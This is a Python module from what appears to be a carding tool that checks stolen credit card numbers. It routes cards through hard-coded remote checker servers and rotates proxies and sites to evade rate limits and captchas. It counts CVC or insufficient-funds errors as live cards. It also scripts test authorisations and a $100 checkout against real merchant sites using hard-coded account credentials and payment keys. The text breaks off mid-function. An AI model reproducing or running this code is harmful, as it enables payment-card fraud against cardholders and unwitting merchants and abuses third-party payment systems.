#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gates module — httpx transport + bounded rotation.

Design:
  * check_shopify_api rotates up to `max_attempts` times per card.
  * Proxy rotates on transport / 429 errors; site rotates on captcha / dead-site.
  * Bans are scaled to pool size — small pools recover fast, big pools stay clean.
  * ORDER_PREVENTED / FAILED / ORDER_FAILED classify as DECLINED (real gateway).
  * GIFT_CARD_PRICE_MUST_BE_GREATER_THAN_0 classifies as ERROR (merchant config).
  * Stripe / Razorpay / generic gates all use 60s timeouts + retry + rotation.
"""

import json
import re
import random
import base64
import time
import urllib3
import hashlib
import threading
from functools import wraps
from typing import Optional, List, Dict, Any, Tuple

import httpx

import warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# ============================================================================
# ENDPOINTS
# ============================================================================
SHOPIFY_API_ENDPOINT = "http://91.244.197.173:8080/shopify"
CARD_API_BASE        = "http://2.25.67.110:5001"
RAZORPAY_API_URL     = "http://91.244.197.173:5003/check"
RAZORPAY_API_KEY     = "Novaop"
MIDASBUY_API         = "http://72.62.16.52:8080/check"

# ============================================================================
# HTTPX GLOBAL CLIENTS
# ============================================================================
_HTTP_TIMEOUT = httpx.Timeout(120.0, connect=10.0)
_HTTP_LIMITS  = httpx.Limits(max_connections=300, max_keepalive_connections=150,
                             keepalive_expiry=30.0)

_HTTP = httpx.Client(
    timeout=_HTTP_TIMEOUT,
    limits=_HTTP_LIMITS,
    verify=False,
    http2=False,
    follow_redirects=False,
)

# 60s per attempt — Stripe live calls routinely take 40-55s under load.
_HTTP_API = httpx.Client(
    timeout=httpx.Timeout(60.0, connect=15.0),
    limits=_HTTP_LIMITS,
    verify=False,
    http2=False,
    follow_redirects=False,
)

# ============================================================================
# GLOBAL BANS — adaptive timing by pool size
# ============================================================================
_PROXY_BAN: Dict[str, float] = {}
_SITE_BAN:  Dict[str, float] = {}
_BAN_LOCK   = threading.Lock()

PROXY_BAN_429_CEILING    = 300
PROXY_BAN_DEAD_CEILING   = 300
SITE_BAN_CAPTCHA_CEILING = 300
SITE_BAN_DEAD_CEILING    = 1800


def _proxy_ban_time_for_pool(pool_size: int, ceiling: int) -> int:
    """Small pools get short bans so proxies come back fast."""
    if pool_size <= 0:
        return ceiling
    if pool_size <= 5:
        return min(20, ceiling)
    if pool_size <= 15:
        return min(60, ceiling)
    if pool_size <= 40:
        return min(120, ceiling)
    return ceiling


def _proxy_banned(p: str) -> bool:
    with _BAN_LOCK:
        t = _PROXY_BAN.get(p)
        if t is None:
            return False
        if t < time.time():
            _PROXY_BAN.pop(p, None)
            return False
        return True


def _site_banned(s: str) -> bool:
    with _BAN_LOCK:
        t = _SITE_BAN.get(s)
        if t is None:
            return False
        if t < time.time():
            _SITE_BAN.pop(s, None)
            return False
        return True


def _ban_proxy(p: str, seconds: int) -> None:
    if not p:
        return
    with _BAN_LOCK:
        _PROXY_BAN[p] = time.time() + seconds


def _ban_site(s: str, seconds: int) -> None:
    if not s:
        return
    with _BAN_LOCK:
        _SITE_BAN[s] = time.time() + seconds


def _pick_proxy(pool: List[str], exclude: Optional[set] = None,
                relax: bool = True) -> Optional[str]:
    """Pick a live proxy. If all banned, fall back to the least-banned one."""
    if not pool:
        return None
    exclude = exclude or set()
    live = [p for p in pool if p not in exclude and not _proxy_banned(p)]
    if live:
        return random.choice(live)
    if not relax:
        return None
    with _BAN_LOCK:
        now = time.time()
        candidates = []
        for p in pool:
            if p in exclude:
                continue
            t = _PROXY_BAN.get(p, 0)
            wait = max(0.0, t - now)
            candidates.append((wait, p))
        if not candidates:
            return None
        candidates.sort()
        return candidates[0][1]


def _pick_site(pool: List[str], exclude: Optional[set] = None,
               relax: bool = True) -> Optional[str]:
    if not pool:
        return None
    exclude = exclude or set()
    live = [s for s in pool if s not in exclude and not _site_banned(s)]
    if live:
        return random.choice(live)
    if not relax:
        return None
    with _BAN_LOCK:
        now = time.time()
        candidates = []
        for s in pool:
            if s in exclude:
                continue
            t = _SITE_BAN.get(s, 0)
            wait = max(0.0, t - now)
            candidates.append((wait, s))
        if not candidates:
            return None
        candidates.sort()
        return candidates[0][1]


# ============================================================================
# TRANSPORT CLASSIFIER
# ============================================================================
_RE_429 = re.compile(r'\b429\b|rate[ _-]?limit|too\s+many\s+requests', re.I)

_RE_CAPTCHA = re.compile(
    r'captcha|challenge_required|cf-chl|cloudflare\s+challenge',
    re.I
)

_RE_DEAD_SITE = re.compile(
    r'\b410\b|cart permalink returned|not a shopify|no product found'
    r'|product not found|shop not found|invalid shop|missing shop',
    re.I
)

_RE_DEAD_PROXY = re.compile(
    r'impersonate|impersonating|impersonateerror'
    r'|curl:\s*\(56\)|connect tunnel failed|proxy dead|proxy error|proxyerror'
    r'|connection refused|remote end closed|no route to host|connect timeout'
    r'|connectionerror|sslerror|connecterror|readtimeout|read timeout'
    r'|step1:exception|step9:exception|step10:exception'
    r'|step6:exception|step3:exception'
    r'|step1:timeout|step9:timeout|step10:timeout|step6:timeout|step3:timeout'
    r'|step1:impersonateerror|step9:impersonateerror|step10:impersonateerror'
    r'|step1:proxyerror|step9:proxyerror|step10:proxyerror'
    r'|step1:sslerror|step9:sslerror|step10:sslerror'
    r'|step1:connecterror|step9:connectionerror|step10:connectionerror'
    r'|product fetch failed'
    r'|all sites failed|all_sites_failed|all attempts exhausted'
    r'|no live site|no-site'
    r'|unable to reach the checker',
    re.I
)

_RE_SERVICE_TRANSIENT = re.compile(
    r'service error\s*\(?5\d\d\)?|service timeout|service temporarily unavailable'
    r'|internal server error|\b500\b|\b502\b|\b503\b|\b504\b',
    re.I
)


def _classify(text: str) -> str:
    """Return RATE_LIMIT / CAPTCHA / DEAD_SITE / DEAD_PROXY / SERVICE_ERR / OK."""
    t = text or ''
    if _RE_429.search(t):
        return 'RATE_LIMIT'
    if _RE_CAPTCHA.search(t):
        return 'CAPTCHA'
    if _RE_DEAD_SITE.search(t):
        return 'DEAD_SITE'
    if _RE_DEAD_PROXY.search(t):
        return 'DEAD_PROXY'
    if _RE_SERVICE_TRANSIENT.search(t):
        return 'SERVICE_ERR'
    return 'OK'


# ============================================================================
# RESPONSE CLASSIFIER
# ============================================================================
_RE_COOKED = re.compile(
    r'ORDER_PLACED|ORDER\s+PLACED|\bCHARGED\b|PAYMENT_SUCCESSFUL|PAYMENT_SUCCESS'
    r'|PURCHASED|PAYMENT_COMPLETED|ORDER\s+APPROVED',
    re.I
)

_RE_LIVE = re.compile(
    r'INSUFFICIENT'
    r'|INCORRECT_CVC|INCORRECT\s+CVC|INCORRECT_CVV|INCORRECT\s+CVV'
    r'|INCORRECT_ZIP|INCORRECT\s+ZIP'
    r'|INCORRECT_ADDRESS|INCORRECT\s+ADDRESS', 
    re.I
)

# PATCHED: merchant-side config errors → ERROR (not card decline).
# These mean "the SITE is misconfigured", not "the CARD is bad".
# Fires BEFORE _RE_DECLINE_STRICT so mixed responses still resolve to ERROR.
_RE_MERCHANT_ERR = re.compile(
    r'GIFT_CARD_PRICE_MUST_BE_GREATER_THAN_0'
    r'|GIFT\s+CARD\s+PRICE\s+MUST\s+BE\s+GREATER\s+THAN\s+0'
    r'|PRICE_MUST_BE_GREATER_THAN_0'
    r'|PRODUCT_PRICE_MUST_BE_GREATER_THAN_0'
    r'|VARIANT_PRICE_MUST_BE_GREATER_THAN_0'
    r'|CART_IS_EMPTY|EMPTY_CART'
    r'|NO_LINE_ITEMS|LINE_ITEMS_ARE_EMPTY'
    r'|PRODUCT_NOT_AVAILABLE_FOR_SALE',
    re.I
)

_RE_DECLINE_STRICT = re.compile(
    r'\b3DS\b|3DS_AUTHENTICATION|AUTHENTICATION_REQUIRED|OTP_REQUIRED'
    r'|CHALLENGE_REQUIRED|ACTION_REQUIRED|COMPLETE_PAYMENT_CHALLENGE'
    r'|CARD_DECLINED|CARD\s+DECLINED|\bDECLINED\b|DO_NOT_HONOR|DO\s+NOT\s+HONOR'
    r'|FRAUD_SUSPECTED|FRAUD\s+SUSPECTED'
    r'|EXPIRED_CARD|CARD_EXPIRED|LOST_CARD|STOLEN_CARD|PICK_UP_CARD|CALL_ISSUER'
    r'|GENERIC_ERROR|PROCESSING_ERROR|INVALID_NUMBER|INVALID_EXPIRY'
    r'|BRAND_NOT_SUPPORTED|CREDIT_CARD_BRAND_IS_NOT_SUPPORTED'
    r'|INVALID_PURCHASE_TYPE|PAYMENT_METHOD_UNSUPPORTED'
    # GIFT_CARD_PRICE_MUST_BE_GREATER_THAN_0 removed — now in _RE_MERCHANT_ERR
    r'|OUT_OF_STOCK|INVENTORY_RESERVATION_FAILURE'
    r'|THE_SUM_OF_PROPOSED_PAYMENTS'
    r'|ORDER_PREVENTED|ORDER\s+PREVENTED'
    r'|ORDER_FAILED|ORDER\s+FAILED'
    r'|(?:^|\s)FAILED(?:\s|$)'
    r'|PAYMENTS_CREDIT_CARD_BASE',
    re.I
)

_RE_TRANSPORT_ERR = re.compile(
    r'step\d+:'
    r'|\bException\b|\bTimeout\b|ProxyError|SSLError|ConnectionError|ConnectError'
    r'|ImpersonateError'
    r'|Service timeout|Service temporarily unavailable|Service error'
    r'|ALL_SITES_FAILED|ALL\s+SITES\s+FAILED|all attempts exhausted'
    r'|no live site|no-site|unable to reach the checker',
    re.I
)


def _classify_response_text(api_status: str, api_response: str) -> str:
    status_up = (api_status or '').upper().strip()
    body      = api_response or ''
    combined  = f"{status_up} {body}"

    if _RE_COOKED.search(combined):
        return 'APPROVED'
    if status_up == 'APPROVED' or status_up.startswith('APPROVED'):
        return 'APPROVED'
    if _RE_LIVE.search(combined):
        return 'APPROVED'
    # NEW: merchant config errors win over decline patterns
    if _RE_MERCHANT_ERR.search(combined):
        return 'ERROR'
    if _RE_DECLINE_STRICT.search(combined):
        return 'DECLINED'
    if _RE_TRANSPORT_ERR.search(combined):
        return 'ERROR'
    return 'ERROR'


# ============================================================================
# RETRY DECORATOR (legacy — used by braintree/authorizenet/midasbuy)
# ============================================================================
def with_retries(max_attempts=3):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            last_error = None
            result = None
            for _ in range(max_attempts):
                try:
                    result = func(*args, **kwargs)
                    if isinstance(result, tuple) and len(result) == 2:
                        msg, status = result
                        if status == "ERROR":
                            cls = _classify(msg)
                            if cls in ('RATE_LIMIT', 'DEAD_PROXY', 'SERVICE_ERR'):
                                last_error = msg
                                time.sleep(0.5)
                                continue
                    return result
                except Exception as e:
                    last_error = str(e)
                    time.sleep(0.5)
                    continue
            if last_error:
                return (f"Proxy retry exhausted: {last_error[:80]}", "ERROR")
            return result
        return wrapper
    return decorator


# ============================================================================
# PROXY NORMALISATION
# ============================================================================
def normalise_proxy(proxy: Optional[str]) -> Optional[str]:
    if not proxy:
        return None
    if proxy.startswith('http://') or proxy.startswith('https://'):
        return proxy
    return f'http://{proxy}'


# ============================================================================
# SECRET SCRUB
# ============================================================================
_SECRET_PATTERNS = [
    re.compile(r'\b\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?\b'),
    re.compile(r'\bhttps?://[^\s\'"]+', re.IGNORECASE),
    re.compile(r'\b2\.25\.\d+\.\d+\b'),
    re.compile(r'\b[a-z0-9-]+\.pointtoserver\.com\b', re.I),
    re.compile(r'\b[a-z0-9-]+\.purevpn\.[a-z]+\b', re.I),
    re.compile(r'\bcheckout\.pci\.shopify(?:cs|inc)?\.[a-z]+\b', re.I),
    re.compile(r'\bshopifycs\.com\b', re.I),
    re.compile(r'\bshopifyinc\.com\b', re.I),
]


def _scrub(msg: str) -> str:
    if not msg:
        return msg
    out = str(msg)
    for pat in _SECRET_PATTERNS:
        out = pat.sub('[hidden]', out)
    return out[:120]


# ============================================================================
# SHOPIFY API — raw call
# ============================================================================
_API_CONCURRENCY = 200
_api_sem = threading.BoundedSemaphore(_API_CONCURRENCY)


def _shopify_api_raw(site_url: str, cc: str, proxy: Optional[str]) -> Dict[str, Any]:
    params = {'site': site_url, 'cc': cc}
    if proxy:
        params['proxy'] = proxy

    try:
        resp = _HTTP.get(SHOPIFY_API_ENDPOINT, params=params)
        resp.raise_for_status()
        data = resp.json()
    except httpx.TimeoutException:
        return {'Response': 'Service timeout', 'status': 'ERROR',
                'gateway': 'Shopify', 'price': '0.00',
                'site': site_url, 'raw_response': 'timeout'}
    except httpx.ConnectError as e:
        return {'Response': 'Service temporarily unavailable', 'status': 'ERROR',
                'gateway': 'Shopify', 'price': '0.00',
                'site': site_url, 'raw_response': _scrub(str(e))}
    except httpx.HTTPStatusError as e:
        return {'Response': f'Service error ({e.response.status_code})',
                'status': 'ERROR', 'gateway': 'Shopify', 'price': '0.00',
                'site': site_url, 'raw_response': _scrub(str(e))}
    except Exception as e:
        return {'Response': 'Service error', 'status': 'ERROR',
                'gateway': 'Shopify', 'price': '0.00',
                'site': site_url, 'raw_response': _scrub(str(e))}

    api_response = str(data.get('Response', 'Unknown'))
    api_status   = str(data.get('status', 'Unknown'))
    gateway      = data.get('gateway', 'Shopify Payments')
    price        = str(data.get('price', '0.00'))
    reason       = str(data.get('reason', ''))

    our_status = _classify_response_text(api_status, api_response)

    return {
        'Response': api_response,
        'status': our_status,
        'gateway': gateway,
        'price': price,
        'site': site_url,
        'reason': reason,
        'raw_response': data,
    }


def _tried_pairs_set(tried: set, kind: str) -> set:
    if kind == 'proxy':
        return {p for (_s, p) in tried}
    return {s for (s, _p) in tried}


# ============================================================================
# CHECK_SHOPIFY_API — rotation loop
# ============================================================================
def check_shopify_api(site_url: str, cc: str, proxy: Optional[str] = None,
                      all_proxies: Optional[List[str]] = None,
                      all_sites: Optional[List[str]] = None,
                      max_attempts: int = 3) -> Dict[str, Any]:
    """
    Rotating single-card check.
    Transport errors rotate proxy; captcha rotates site; 500/timeout retries.
    """
    max_attempts = max(1, int(max_attempts))

    _api_sem.acquire()
    try:
        pool_size = len(all_proxies) if all_proxies else (1 if proxy else 0)
        proxy_ban_429  = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_429_CEILING)
        proxy_ban_dead = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_DEAD_CEILING)

        tried_pairs = set()
        cur_site  = site_url
        cur_proxy = proxy

        last_result: Optional[Dict[str, Any]] = None

        sites_pool = list(all_sites) if all_sites else []
        if cur_site and cur_site not in sites_pool:
            sites_pool.append(cur_site)
        if not sites_pool and cur_site:
            sites_pool = [cur_site]

        for attempt in range(max_attempts):
            # pick proxy
            if all_proxies:
                if cur_proxy is None or _proxy_banned(cur_proxy):
                    cur_proxy = _pick_proxy(
                        all_proxies, exclude=_tried_pairs_set(tried_pairs, 'proxy')
                    )
                if cur_proxy is None:
                    cur_proxy = _pick_proxy(all_proxies, relax=True)

            # pick site
            if sites_pool:
                if cur_site is None or _site_banned(cur_site):
                    cur_site = _pick_site(
                        sites_pool, exclude=_tried_pairs_set(tried_pairs, 'site')
                    )
                if cur_site is None:
                    cur_site = _pick_site(sites_pool, relax=True)

            if not cur_site:
                return {
                    'Response': 'No live site available',
                    'status': 'ERROR',
                    'gateway': 'Shopify',
                    'price': '0.00',
                    'site': site_url,
                    'raw_response': 'no-site',
                }

            pair = (cur_site, cur_proxy)
            if pair in tried_pairs and attempt < max_attempts - 1:
                cur_proxy = None
                cur_site  = None
                continue
            tried_pairs.add(pair)

            result = _shopify_api_raw(cur_site, cc, cur_proxy)
            last_result = result
            resp_text = str(result.get('Response', ''))
            status    = result.get('status', 'ERROR')

            if status in ('APPROVED', 'DECLINED'):
                if _classify(resp_text) == 'OK':
                    return result

            cls = _classify(resp_text)

            if cls == 'RATE_LIMIT':
                if cur_proxy:
                    _ban_proxy(cur_proxy, proxy_ban_429)
                cur_proxy = None
                continue

            if cls == 'CAPTCHA':
                _ban_site(cur_site, SITE_BAN_CAPTCHA_CEILING)
                cur_site = None
                continue

            if cls == 'DEAD_SITE':
                _ban_site(cur_site, SITE_BAN_DEAD_CEILING)
                cur_site = None
                continue

            if cls == 'DEAD_PROXY':
                if cur_proxy:
                    _ban_proxy(cur_proxy, proxy_ban_dead)
                cur_proxy = None
                continue

            if cls == 'SERVICE_ERR':
                if cur_proxy:
                    _ban_proxy(cur_proxy, proxy_ban_dead)
                cur_proxy = None
                cur_site  = None
                continue

            cur_proxy = None
            cur_site  = None
            continue

        if last_result is not None:
            return last_result
        return {
            'Response': 'All attempts exhausted',
            'status': 'ERROR',
            'gateway': 'Shopify',
            'price': '0.00',
            'site': site_url,
            'raw_response': 'exhausted',
        }

    finally:
        try:
            _api_sem.release()
        except ValueError:
            pass


def process_shopify_api_response(api_response: Dict[str, Any],
                                 site_price: str = '0.00'
                                 ) -> Tuple[str, str, str]:
    if not api_response or not isinstance(api_response, dict):
        return "System Error", "ERROR", "Shopify Payments"
    return (api_response.get('Response', 'Unknown'),
            api_response.get('status', 'ERROR'),
            api_response.get('gateway', 'Shopify Payments'))


# ============================================================================
# GENERIC CARD-API CALLER (60s + retry + rotation)
# ============================================================================
def _call_self_api(endpoint: str, cc: str, proxy: Optional[str] = None,
                   all_proxies: Optional[List[str]] = None,
                   max_attempts: int = 2) -> Tuple[str, str]:
    url = f"{CARD_API_BASE}/{endpoint}"
    headers = {"X-API-Key": "novaop"}

    max_attempts = max(1, int(max_attempts))
    pool_size = len(all_proxies) if all_proxies else (1 if proxy else 0)
    ban_429   = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_429_CEILING)
    ban_dead  = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_DEAD_CEILING)

    cur_proxy = proxy
    last_error = None

    for _ in range(max_attempts):
        if all_proxies and (cur_proxy is None or _proxy_banned(cur_proxy)):
            cur_proxy = _pick_proxy(all_proxies, relax=True)

        params = {'cc': cc}
        if cur_proxy:
            params['proxy'] = cur_proxy

        try:
            resp = _HTTP_API.get(url, params=params, headers=headers,
                                 timeout=httpx.Timeout(60.0, connect=15.0))
            resp.raise_for_status()
            data = resp.json()
            if data.get('status', False):
                return data.get('message', 'Unknown'), "APPROVED"
            return data.get('message', 'Unknown'), "DECLINED"

        except httpx.TimeoutException:
            if cur_proxy:
                _ban_proxy(cur_proxy, ban_dead)
            cur_proxy = None
            last_error = f"{endpoint} timeout (60s)"
            continue

        except httpx.ConnectError:
            if cur_proxy:
                _ban_proxy(cur_proxy, ban_dead)
            cur_proxy = None
            last_error = f"{endpoint} connect error"
            continue

        except httpx.HTTPStatusError as e:
            code = e.response.status_code
            if code == 429 and cur_proxy:
                _ban_proxy(cur_proxy, ban_429)
                cur_proxy = None
                last_error = f"{endpoint} rate-limited"
                continue
            return f"{endpoint} HTTP {code}", "ERROR"

        except Exception as e:
            last_error = f"{endpoint} error: {str(e)[:80]}"
            continue

    return last_error or f"{endpoint} exhausted", "ERROR"


# ============================================================================
# STRIPE AUTH — 60s per attempt, retry + rotation
# ============================================================================
def check_stripe_auth(cc: str, proxy: Optional[str] = None,
                      all_proxies: Optional[List[str]] = None,
                      max_attempts: int = 2) -> Tuple[str, str]:
    url = f"{CARD_API_BASE}/stripe_auth"
    headers = {"X-API-Key": "novaop"}

    max_attempts = max(1, int(max_attempts))
    pool_size = len(all_proxies) if all_proxies else (1 if proxy else 0)
    ban_429   = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_429_CEILING)
    ban_dead  = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_DEAD_CEILING)

    cur_proxy = proxy
    last_error = None

    for _ in range(max_attempts):
        if all_proxies and (cur_proxy is None or _proxy_banned(cur_proxy)):
            cur_proxy = _pick_proxy(all_proxies, relax=True)

        params = {'cc': cc}
        if cur_proxy:
            params['proxy'] = cur_proxy

        try:
            resp = _HTTP_API.get(url, params=params, headers=headers,
                                 timeout=httpx.Timeout(60.0, connect=15.0))
            resp.raise_for_status()
            data = resp.json()
            raw_msg = data.get('message', 'Unknown')
            if data.get('status', False):
                return raw_msg, "APPROVED"
            return raw_msg, "DECLINED"

        except httpx.TimeoutException:
            if cur_proxy:
                _ban_proxy(cur_proxy, ban_dead)
            cur_proxy = None
            last_error = "Stripe Auth timeout (60s)"
            continue

        except httpx.ConnectError:
            if cur_proxy:
                _ban_proxy(cur_proxy, ban_dead)
            cur_proxy = None
            last_error = "Stripe Auth connect error"
            continue

        except httpx.HTTPStatusError as e:
            code = e.response.status_code
            if code == 429 and cur_proxy:
                _ban_proxy(cur_proxy, ban_429)
                cur_proxy = None
                last_error = "Stripe Auth rate-limited"
                continue
            return f"Stripe Auth HTTP {code}", "ERROR"

        except Exception as e:
            last_error = f"Stripe Auth error: {str(e)[:80]}"
            continue

    return last_error or "Stripe Auth exhausted", "ERROR"


# ============================================================================
# STRIPE CHARGE — 60s per attempt, retry + rotation
# ============================================================================
def check_stripe_charge(cc: str, proxy: Optional[str] = None,
                        all_proxies: Optional[List[str]] = None,
                        max_attempts: int = 2) -> Tuple[str, str]:
    url = f"{CARD_API_BASE}/stripe_charge"
    headers = {"X-API-Key": "novaop"}

    max_attempts = max(1, int(max_attempts))
    pool_size = len(all_proxies) if all_proxies else (1 if proxy else 0)
    ban_429   = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_429_CEILING)
    ban_dead  = _proxy_ban_time_for_pool(pool_size, PROXY_BAN_DEAD_CEILING)

    cur_proxy = proxy
    last_error = None

    for _ in range(max_attempts):
        if all_proxies and (cur_proxy is None or _proxy_banned(cur_proxy)):
            cur_proxy = _pick_proxy(all_proxies, relax=True)

        params = {'cc': cc}
        if cur_proxy:
            params['proxy'] = cur_proxy

        try:
            resp = _HTTP_API.get(url, params=params, headers=headers,
                                 timeout=httpx.Timeout(60.0, connect=15.0))
            resp.raise_for_status()
            data = resp.json()
            if data.get('status', False):
                return data.get('message', 'Unknown'), "APPROVED"
            return data.get('message', 'Unknown'), "DECLINED"

        except httpx.TimeoutException:
            if cur_proxy:
                _ban_proxy(cur_proxy, ban_dead)
            cur_proxy = None
            last_error = "Stripe Charge timeout (60s)"
            continue

        except httpx.ConnectError:
            if cur_proxy:
                _ban_proxy(cur_proxy, ban_dead)
            cur_proxy = None
            last_error = "Stripe Charge connect error"
            continue

        except httpx.HTTPStatusError as e:
            code = e.response.status_code
            if code == 429 and cur_proxy:
                _ban_proxy(cur_proxy, ban_429)
                cur_proxy = None
                last_error = "Stripe Charge rate-limited"
                continue
            return f"Stripe Charge HTTP {code}", "ERROR"

        except Exception as e:
            last_error = f"Stripe Charge error: {str(e)[:80]}"
            continue

    return last_error or "Stripe Charge exhausted", "ERROR"


# ============================================================================
# PAYPAL
# ============================================================================
def check_paypal(cc: str, proxy: Optional[str] = None,
                 all_proxies: Optional[List[str]] = None) -> Tuple[str, str]:
    raw_msg, status = _call_self_api('paypal', cc, proxy, all_proxies=all_proxies)
    if "LIVE" in raw_msg.upper() or "CHARGED" in raw_msg.upper():
        return raw_msg, "APPROVED"
    return raw_msg, status


check_paypal_charge  = check_paypal
check_paypal_donate  = check_paypal
check_paypal_fixed   = check_paypal
check_paypal_general = check_paypal
check_paypal_onyx    = check_paypal


# ============================================================================
# VBV / 3DS
# ============================================================================
def check_vbv_lookup(cc: str, proxy: Optional[str] = None,
                     all_proxies: Optional[List[str]] = None) -> Tuple[str, str]:
    return _call_self_api('vbv_lookup', cc, proxy, all_proxies=all_proxies)


# ============================================================================
# BRAINTREE (API)
# ============================================================================
def check_braintree_api(cc: str, proxy: Optional[str] = None,
                        all_proxies: Optional[List[str]] = None) -> Tuple[str, str]:
    return _call_self_api('braintree_auth', cc, proxy, all_proxies=all_proxies)


# ============================================================================
# BRAINTREE B3
# ============================================================================
@with_retries(max_attempts=2)
def check_braintree_b3(cc: str, proxy: Optional[str] = None) -> Tuple[str, str]:
    parts = cc.strip().split("|")
    if len(parts) != 4:
        return "Invalid card format", "ERROR"
    n, mm, yy, cvc = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = "20" + yy
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    proxy_url = normalise_proxy(proxy)
    s = None
    try:
        s = httpx.Client(proxies=proxy_url, verify=False, timeout=30.0) if proxy_url else httpx.Client(verify=False, timeout=30.0)
        resp = s.get('https://unclejimswormfarm.com/my-account/', headers={'User-Agent': ua})
        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', resp.text).group(1)
        login_data = (f'username=shamon843738@gmail.com&password=shamon843738@gmail.com'
                      f'&woocommerce-login-nonce={login_nonce}'
                      f'&_wp_http_referer=%2Fmy-account%2F&login=Log+in')
        s.post('https://unclejimswormfarm.com/my-account/', data=login_data,
               headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua})
        resp = s.get('https://unclejimswormfarm.com/my-account/add-payment-method/', headers={'User-Agent': ua})
        payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text).group(1)
        b_token_enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', resp.text).group(1)
        b_token = base64.b64decode(b_token_enc).decode()
        auth_fingerprint = re.search(r'"authorizationFingerprint":"(.*?)"', b_token).group(1)
        merchant_id = re.search(r'merchantId":"(.*?)"', b_token).group(1)
        gql_data = {
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
            "variables": {"input": {"creditCard": {
                "number": n, "expirationMonth": mm, "expirationYear": yy[-2:], "cvv": cvc,
                "billingAddress": {"postalCode": "10010", "streetAddress": "5875 South Aviation Avenue"}
            }, "options": {"validate": False}}}}
        resp = s.post('https://payments.braintree-api.com/graphql', json=gql_data, headers={
            'Authorization': f'Bearer {auth_fingerprint}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'User-Agent': ua,
        })
        token_m = re.search(r'"token":"(.*?)"', resp.text)
        if not token_m:
            return "Tokenization failed", "ERROR"
        token = token_m.group(1)
        add_data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': f'{{"environment":"production","merchantId":"{merchant_id}"}}',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        resp = s.post('https://unclejimswormfarm.com/my-account/add-payment-method/', data=add_data,
                      headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua})
        if "Payment method successfully added" in resp.text or "New payment method added" in resp.text:
            return "Card added (Auth OK)", "APPROVED"
        if "woocommerce-error" in resp.text:
            err = re.search(r'<ul class="woocommerce-error">\s*<li>\s*(.*?)\s*</li>', resp.text, re.DOTALL)
            reason = err.group(1).strip() if err else "Declined"
            return f"DECLINED: {reason}", "DECLINED"
        return "Unknown response", "ERROR"
    except Exception as e:
        return f"Braintree error: {str(e)[:80]}", "ERROR"
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


# ============================================================================
# AUTHORIZE.NET
# ============================================================================
@with_retries(max_attempts=2)
def check_authorize_net(cc: str, proxy: Optional[str] = None) -> Tuple[str, str]:
    parts = cc.strip().split("|")
    if len(parts) != 4:
        return "Invalid card format", "ERROR"
    n, mm, yy, cvc = parts
    mm = mm.zfill(2)
    if "20" in yy:
        yy = yy.split("20")[1]
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    proxy_url = normalise_proxy(proxy)
    s = httpx.Client(proxies=proxy_url, verify=False, timeout=30.0) if proxy_url else httpx.Client(verify=False, timeout=30.0)
    try:
        token_url = 'https://api2.authorize.net/xml/v1/request.api'
        token_data = {"securePaymentContainerRequest": {"merchantAuthentication": {
            "name": "3q85aDr4SN9t",
            "clientKey": "224BvW2FU79Fuzx86cxGMFpsdU3Bc7cqA9cvx64u6XXD5y6qTFmhFEHGF8Dhu6tC"
        }, "data": {"type": "TOKEN", "id": "da6eaa1f-2da0-9a00-ad1b-b9ff572a19a4",
                    "token": {"cardNumber": n, "expirationDate": f"20{yy}-{mm}",
                              "cardCode": cvc, "zip": "58104", "fullName": "Mr perfect"}}}}
        resp = s.post(token_url, json=token_data, headers={
            'Accept': '*/*', 'Content-Type': 'application/json',
            'Origin': 'https://www.bomaphila.com', 'User-Agent': ua})
        token = resp.json().get('opaqueData', {}).get('dataValue')
        if not token:
            return "Tokenization failed", "ERROR"
        form_resp = s.get('https://api.membershipworks.com/v2/form?ttl=Invoices',
                          headers={'accept': 'application/json', 'user-agent': ua, 'x-org': '29723'})
        form_id = form_resp.json().get('fid')
        if not form_id:
            return "Form ID not found", "ERROR"
        checkout_url = f'https://api.membershipworks.com/v2/form/{form_id}/checkout'
        fields = {
            'nam': 'Mr perfect', 'xni': 'Mr perfect', 'eml': 'mrperfectxyct@gmail.com',
            'phn': '06534235789', 'xin': '3453452q', 'xvn': '43523452',
            'crd[nam]': 'Mr perfect ', 'crd[ad1]': '145 Marco street',
            'crd[cot]': 'Cass County', 'crd[sta]': 'ND', 'crd[con]': 'US',
            'crd[zip]': '58104', 'crd[cit]': 'Fargo', 'crd[loc][0]': '-96.8054856',
            'crd[loc][1]': '46.8213838', 'crd[tok]': token, 'sum': '100',
            'itm[0][_id]': '63b85320ab1e2e42be3eab83', 'itm[0][amt]': '100', 'itm[0][qty]': '1',
        }
        boundary = '----WebKitFormBoundaryz7wbnClCdUKdtQ5n'
        body = ''
        for name, value in fields.items():
            body += f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'
        body += f'--{boundary}--\r\n'
        resp = s.post(checkout_url, data=body.encode('utf-8'), headers={
            'accept': 'application/json',
            'content-type': f'multipart/form-data; boundary={boundary}',
            'origin': 'https://www.bomaphila.com', 'referer': 'https://www.bomaphila.com/',
            'user-agent': ua, 'x-org': '29723'})
